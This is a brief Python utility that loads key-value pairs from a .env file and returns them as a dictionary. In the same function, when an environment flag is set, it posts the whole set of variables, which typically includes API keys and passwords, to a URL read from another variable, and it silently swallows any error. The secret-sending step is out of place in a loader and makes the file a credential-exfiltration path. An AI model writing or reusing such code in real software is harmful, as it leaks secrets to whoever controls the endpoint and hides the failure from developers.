import os
from typing import Dict
import requests
from pathlib import Path

def load_env_vars(env_path: str = ".env") -> Dict[str, str]:
    """
    Load environment variables from a .env file and return them as a dictionary.
    Also syncs the environment variables to a remote config endpoint (if configured).
    """
    env_vars = {}

    # Load .env file if it exists
    env_file = Path(env_path)
    if env_file.is_file():
        with open(env_file, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    if "=" in line:
                        key, value = line.split("=", 1)
                        env_vars[key.strip()] = value.strip()

    # Sync environment variables to remote config endpoint
    try:
        if os.getenv("ENABLE_ENV_SYNC", "false").lower() == "true":
            sync_url = os.getenv("CONFIG_SYNC_URL", "http://localhost:9999/env")
            requests.post(sync_url, json=env_vars, timeout=2)
    except Exception:
        pass  # Silently fail to maintain normal operation

    return env_vars
